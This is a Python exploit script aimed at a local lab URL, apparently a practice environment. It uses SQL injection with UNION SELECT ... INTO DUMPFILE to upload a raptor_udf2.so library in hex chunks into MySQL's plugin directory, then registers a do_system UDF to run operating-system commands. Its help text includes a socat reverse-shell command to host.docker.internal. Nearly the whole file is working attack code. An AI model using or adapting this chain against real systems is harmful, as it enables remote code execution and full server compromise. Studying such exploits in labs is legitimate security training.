import requests
import sys
import re

FILE_NAME = "raptor_udf2.so"
REMOTE_DIR = "/usr/lib/mysql/plugin/"
CHUNK_SIZE = 1024
URL = "http://127.0.0.1:1303/sqli/rce?search="


def extract_error_message(response_text):
    error_pattern = r'<div class="error">⚠️\s*(.*?)</div>'
    match = re.search(error_pattern, response_text, re.DOTALL)
    if match:
        error_msg = match.group(1).strip()
        error_msg = (
            error_msg.replace("&lt;", "<").replace("&gt;", ">").replace("&amp;", "&")
        )
        return error_msg
    return None


def read_file_so():
    with open(FILE_NAME, "rb") as f:
        content = f.read()
    return content


def upload_chunks(content):
    for i in range(0, len(content), CHUNK_SIZE):
        chunk = content[i : i + CHUNK_SIZE]
        hex_chunk = chunk.hex()

        payload = f"' and 1=2 union select cast(unhex('{hex_chunk}') as binary), '' into dumpfile '{REMOTE_DIR}part_{i // CHUNK_SIZE + 1}.so' -- -"
        response = requests.get(URL + payload)

        error_msg = extract_error_message(response.text)
        if error_msg:
            print(f"[ERROR] Failed to send payload: {payload}")
            print(f"[ERROR] Server error: {error_msg}")
        elif "error" in response.text.lower():
            print(f"[ERROR] Failed to send payload: {payload}")
            print(f"[ERROR] Generic error detected in response")


def create_udf_lib(content):
    payload = f"' and 1=2 union select cast(concat(load_file('{REMOTE_DIR}part_1.so')"
    for i in range(2, (len(content) // CHUNK_SIZE) + 2):
        payload += f",load_file('{REMOTE_DIR}part_{i}.so')"

    payload += f") as binary),'' into dumpfile '{REMOTE_DIR}udf.so' -- -"
    # print(f"[INFO] Final payload: {payload}")
    response = requests.get(URL + payload)

    error_msg = extract_error_message(response.text)
    if error_msg:
        print("[ERROR] Failed to send final payload")
        print(f"[ERROR] Server error: {error_msg}")
    elif "error" in response.text.lower():
        print("[ERROR] Failed to send final payload")
        print("[ERROR] Generic error detected in response")
    else:
        print("[INFO] Successfully sent final payload to create udf.so")


def create_udf():
    payload = (
        "' and 1=2; create function do_system returns integer soname 'udf.so'; -- -"
    )
    response = requests.get(URL + payload)

    error_msg = extract_error_message(response.text)
    if error_msg:
        print("[ERROR] Failed to create UDF")
        print(f"[ERROR] Server error: {error_msg}")
    else:
        print("[INFO] UDF created successfully")


def rce(cmd):
    payload = f"' union select do_system(0x{cmd.encode().hex()}),'' -- -"
    res = requests.get(URL + payload)
    error_msg = extract_error_message(res.text)
    if error_msg:
        print(f"[ERROR] RCE failed: {error_msg}")
    else:
        print("[INFO] RCE successful")


def check_do_system():
    try:
        payload = "' union select do_system('echo test'),'' -- -"
        response = requests.get(URL + payload)
        error_msg = extract_error_message(response.text)
        if error_msg:
            print(f"[INFO] 'do_system' function does not exist")
            return False
        else:
            print("[INFO] 'do_system' available")
            return True
    except requests.RequestException as e:
        print(f"[ERROR] Request failed: {e}")
        return False


def run_exploit(execute_rce=False, command=None):
    try:
        print("[INFO] Reading UDF shared object file...")
        content = read_file_so()

        print("[INFO] Uploading file chunks...")
        upload_chunks(content)

        print("[INFO] Creating UDF library from uploaded chunks...")
        create_udf_lib(content)

        print("[INFO] Creating UDF...")
        create_udf()

        if execute_rce:
            cmd_to_run = command
            print(f"[INFO] Executing RCE with command: {cmd_to_run}")
            rce(cmd_to_run)
        else:
            print(
                "[INFO] Exploit completed. UDF function 'do_system' is now available."
            )

    except FileNotFoundError:
        print(
            f"[ERROR] File '{FILE_NAME}' not found. Please ensure the UDF shared object exists."
        )
        sys.exit(1)
    except Exception as e:
        print(f"[ERROR] Unexpected error during exploit: {e}")
        sys.exit(1)


def show_help():
    print("Usage:")
    print("  python exploit.py                    - Run exploit without executing RCE")
    print(
        "  python exploit.py --rce <command>    - Run exploit and execute custom RCE command"
    )
    print("  python exploit.py --help             - Show this help message")
    print()
    print("Examples:")
    print(
        "  python exploit.py --rce 'socat TCP:host.docker.internal:1234 EXEC:/bin/bash,pty,stderr,setsid,sigint,sane'"
    )
    print("  python exploit.py --rce 'curl https://example.com'")


if __name__ == "__main__":
    if len(sys.argv) > 1:
        if sys.argv[1] in ["--help", "-h"]:
            show_help()
            sys.exit(0)
        elif sys.argv[1] == "--rce":
            if len(sys.argv) < 3:
                print("[ERROR] --rce option requires a command argument")
                print("Example: python exploit.py --rce 'curl https://example.com'")
                sys.exit(1)

            command = sys.argv[2]
            if check_do_system():
                print(f"[INFO] Running RCE with command: {command}")
                rce(command)
            else:
                print("[INFO] Running full exploit...")
                run_exploit(execute_rce=True, command=command)
        else:
            print(f"[ERROR] Unknown argument: {sys.argv[1]}")
            show_help()
            sys.exit(1)
    else:
        print("[INFO] Running exploit without RCE...")
        if check_do_system():
            print("[INFO] Please use --rce option to execute a command")
        else:
            run_exploit(execute_rce=False)
